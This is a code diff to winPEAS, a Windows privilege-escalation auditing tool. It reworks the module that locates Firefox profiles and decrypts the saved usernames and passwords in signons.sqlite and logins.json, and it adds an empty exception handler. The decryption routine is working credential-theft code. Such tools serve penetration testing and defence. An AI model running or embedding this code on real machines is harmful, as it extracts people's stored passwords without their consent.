@@ -6,8 +6,8 @@ using System.Text.RegularExpressions;
 using winPEAS.Checks;
 using winPEAS.Helpers;
 using winPEAS.KnownFileCreds.Browsers.Models;
-using winPEAS._3rdParty.MicroJson;
 using winPEAS._3rdParty.SQLite;
+using System.Web.Script.Serialization;
 
 namespace winPEAS.KnownFileCreds.Browsers.Firefox
 {
@@ -230,92 +230,103 @@ namespace winPEAS.KnownFileCreds.Browsers.Firefox
 
         public override IEnumerable<CredentialModel> GetSavedCredentials()
         {
+            var logins = new List<CredentialModel>();
+
             string signonsFile = null;
             string loginsFile = null;
             bool signonsFound = false;
             bool loginsFound = false;
-            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
-            var logins = new List<CredentialModel>();
-            if (dirs.Length == 0)
-                return logins;
-
-            foreach (string dir in dirs)
+            try
             {
-                string[] files = Directory.GetFiles(dir, "signons.sqlite");
-                if (files.Length > 0)
+                string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+
+                if (dirs.Length == 0)
                 {
-                    signonsFile = files[0];
-                    signonsFound = true;
+                    return logins;
                 }
 
-                // find &quot;logins.json"file
-                files = Directory.GetFiles(dir, "logins.json");
-                if (files.Length > 0)
+                foreach (string dir in dirs)
                 {
-                    loginsFile = files[0];
-                    loginsFound = true;
-                }
-
-                if (loginsFound || signonsFound)
-                {
-                    FFDecryptor.NSS_Init(dir);
-                    break;
-                }
-
-            }
-
-            if (signonsFound)
-            {
-                SQLiteDatabase database = new SQLiteDatabase("Data Source=" + signonsFile + ";");
-                string query = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
-                DataTable resultantQuery = database.ExecuteQuery(query);
-
-                if (resultantQuery.Rows.Count > 0)
-                {
-                    foreach (DataRow row in resultantQuery.Rows)
+                    string[] files = Directory.GetFiles(dir, "signons.sqlite");
+                    if (files.Length > 0)
                     {
-                        string encryptedUsername = row["encryptedUsername"] is System.DBNull ? string.Empty : (string)row["encryptedUsername"];
-                        string encryptedPassword = row["encryptedPassword"] is System.DBNull ? string.Empty : (string)row["encryptedPassword"];
-                        string hostname = row["hostname"] is System.DBNull ? string.Empty : (string)row["hostname"];
+                        signonsFile = files[0];
+                        signonsFound = true;
+                    }
 
-                        string username = FFDecryptor.Decrypt(encryptedUsername);
-                        string password = FFDecryptor.Decrypt(encryptedPassword);
+                    // find &quot;logins.json"file
+                    files = Directory.GetFiles(dir, "logins.json");
+                    if (files.Length > 0)
+                    {
+                        loginsFile = files[0];
+                        loginsFound = true;
+                    }
 
+                    if (loginsFound || signonsFound)
+                    {
+                        FFDecryptor.NSS_Init(dir);
+                        break;
+                    }
+
+                }
+
+                if (signonsFound)
+                {
+                    SQLiteDatabase database = new SQLiteDatabase("Data Source=" + signonsFile + ";");
+                    string query = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
+                    DataTable resultantQuery = database.ExecuteQuery(query);
+
+                    if (resultantQuery.Rows.Count > 0)
+                    {
+                        foreach (DataRow row in resultantQuery.Rows)
+                        {
+                            string encryptedUsername = row["encryptedUsername"] is System.DBNull ? string.Empty : (string)row["encryptedUsername"];
+                            string encryptedPassword = row["encryptedPassword"] is System.DBNull ? string.Empty : (string)row["encryptedPassword"];
+                            string hostname = row["hostname"] is System.DBNull ? string.Empty : (string)row["hostname"];
+
+                            string username = FFDecryptor.Decrypt(encryptedUsername);
+                            string password = FFDecryptor.Decrypt(encryptedPassword);
+
+                            logins.Add(new CredentialModel
+                            {
+                                Username = username,
+                                Password = password,
+                                Url = hostname
+                            });
+                        }
+
+                        database.CloseDatabase();
+                    }
+                }
+
+                if (loginsFound)
+                {
+                    FFLogins ffLoginData;
+                    using (StreamReader sr = new StreamReader(loginsFile))
+                    {
+                        string json = sr.ReadToEnd();
+
+                        ffLoginData = new JavaScriptSerializer().Deserialize<FFLogins>(json);
+                    }
+
+                    foreach (Browsers.Firefox.LoginData loginData in ffLoginData.logins)
+                    {
+                        string username = Browsers.Firefox.FFDecryptor.Decrypt(loginData.encryptedUsername);
+                        string password = Browsers.Firefox.FFDecryptor.Decrypt(loginData.encryptedPassword);
                         logins.Add(new CredentialModel
                         {
                             Username = username,
                             Password = password,
-                            Url = hostname
+                            Url = loginData.hostname
                         });
                     }
-
-                    database.CloseDatabase();
                 }
             }
-
-            if (loginsFound)
-            {
-                FFLogins ffLoginData;
-                using (StreamReader sr = new StreamReader(loginsFile))
-                {
-                    string json = sr.ReadToEnd();
-
-                    ffLoginData = new JsonSerializer().Deserialize<Browsers.Firefox.FFLogins>(json);
-                }
-
-                foreach (Browsers.Firefox.LoginData loginData in ffLoginData.logins)
-                {
-                    string username = Browsers.Firefox.FFDecryptor.Decrypt(loginData.encryptedUsername);
-                    string password = Browsers.Firefox.FFDecryptor.Decrypt(loginData.encryptedPassword);
-                    logins.Add(new CredentialModel
-                    {
-                        Username = username,
-                        Password = password,
-                        Url = loginData.hostname
-                    });
-                }
+            catch (Exception e)
+            {                
             }
+            
             return logins;
         }
     }
